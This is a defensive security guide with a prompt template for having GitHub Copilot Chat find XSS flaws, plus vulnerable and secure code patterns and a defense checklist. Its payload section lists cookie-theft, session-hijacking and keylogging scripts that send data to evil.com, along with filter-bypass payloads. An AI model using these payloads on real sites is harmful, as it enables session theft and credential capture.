# XSS Scanning Prompt

## Purpose
Use this prompt with GitHub Copilot Chat to identify Cross-Site Scripting (XSS) vulnerabilities in web applications.

## Prompt Template

```
Analyze this codebase for XSS vulnerabilities. Identify:

1. All uses of dangerouslySetInnerHTML (React)
2. innerHTML assignments without sanitization
3. document.write() with user data
4. eval() and new Function() with user input
5. URL parameters rendered without encoding
6. href/src attributes with javascript: protocol potential
7. Event handler attributes built from user data

For each finding:
- Show the vulnerable code
- Explain XSS type (Stored/Reflected/DOM-based)
- Provide example attack payload
- Show sanitized/encoded alternative
- Rate severity

Output in structured JSON format.
```

## Usage Examples

### React Component Scan
```
@workspace Scan all React components for XSS vulnerabilities.
Focus on:
- dangerouslySetInnerHTML usage
- Unsanitized props rendered to DOM
- URL parameter handling
- Third-party content rendering
```

### Express.js API Scan
```
Review this Express app for reflected XSS:
[paste code]

Check:
1. Response rendering with user input
2. Error messages containing request data
3. Redirects with unvalidated URLs
4. Template injection points
```

### DOM-based XSS Detection
```
Analyze client-side JavaScript for DOM-based XSS:

1. Find all uses of location.hash, location.search
2. Track data flow to DOM sinks (innerHTML, document.write)
3. Identify missing sanitization
4. Check event handler assignments
```

## Expected Copilot Response Format

```json
{
  "findings": [
    {
      "file": "UserProfile.jsx",
      "line": 42,
      "severity": "HIGH",
      "xssType": "DOM-based",
      "vulnerableCode": "<div dangerouslySetInnerHTML={{ __html: userBio }} />",
      "sink": "dangerouslySetInnerHTML",
      "source": "userBio (user input)",
      "attackPayload": "<img src=x onerror=\"alert(document.cookie)\">",
      "secureAlternative": "import DOMPurify from 'dompurify';\n<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userBio) }} />",
      "cwe": "CWE-79",
      "owasp": "A03:2021 - Injection"
    }
  ]
}
```

## XSS Types Reference

### Reflected XSS
- User input immediately reflected in response
- URL parameters, form data, headers
- Example: Search results page showing search term

### Stored XSS
- Malicious script stored in database
- Executed when other users view the data
- Example: Comment systems, user profiles

### DOM-based XSS
- Vulnerability in client-side JavaScript
- No server involvement
- Example: JavaScript reading URL hash and writing to DOM

## Common Vulnerable Patterns

### React
```jsx
// VULNERABLE: dangerouslySetInnerHTML without sanitization
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// VULNERABLE: href with user data
<a href={userProvidedUrl}>Link</a>

// SECURE: Use DOMPurify
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
```

### Vanilla JavaScript
```javascript
// VULNERABLE: innerHTML
element.innerHTML = userInput;

// VULNERABLE: document.write
document.write(userInput);

// SECURE: textContent (no HTML parsing)
element.textContent = userInput;
```

### Express.js
```javascript
// VULNERABLE: Unescaped rendering
res.send(`<h1>Search: ${req.query.q}</h1>`);

// SECURE: Use template engine with auto-escaping
res.render('search', { query: req.query.q });  // Most engines escape by default
```

## XSS Payload Examples

### Basic Testing
```html
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
```

### Cookie Theft
```html
<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>
<img src=x onerror="fetch('http://evil.com/steal?c='+document.cookie)">
```

### Session Hijacking
```html
<script>document.location='http://evil.com/hijack?session='+document.cookie</script>
```

### Keylogging
```html
<script>
document.onkeypress=function(e){
  new Image().src='http://evil.com/log?k='+e.key;
}
</script>
```

### Filter Bypass Payloads
```html
<!-- Case variation -->
<ScRiPt>alert('XSS')</sCrIpT>

<!-- Encoded -->
<img src=x onerror="&#97;lert('XSS')">

<!-- Event handler variations -->
<div onmouseover="alert('XSS')">Hover me</div>
<input onfocus="alert('XSS')" autofocus>
<marquee onstart="alert('XSS')">

<!-- SVG -->
<svg><script>alert('XSS')</script></svg>
<svg onload="alert('XSS')">
```

## Defense Checklist

### Input Validation
- [ ] Whitelist allowed characters
- [ ] Reject or encode special characters
- [ ] Validate data types and lengths

### Output Encoding
- [ ] HTML encode for HTML context
- [ ] JavaScript encode for JS context
- [ ] URL encode for URL context
- [ ] CSS encode for style context

### Content Security Policy
- [ ] Implement strict CSP headers
- [ ] Disable inline scripts where possible
- [ ] Use nonces for necessary inline scripts

### Sanitization Libraries
- [ ] Use DOMPurify for HTML sanitization
- [ ] Configure allowed tags/attributes
- [ ] Keep libraries updated

## Testing Commands

```bash
# Test reflected XSS
curl "http://localhost:3000/search?q=<script>alert(1)</script>"

# Test stored XSS via API
curl -X POST http://localhost:3000/comment \
  -H "Content-Type: application/json" \
  -d '{"text": "<img src=x onerror=alert(1)>"}'

# Test DOM XSS
# Visit: http://localhost:3000/#<img src=x onerror=alert(1)>
```
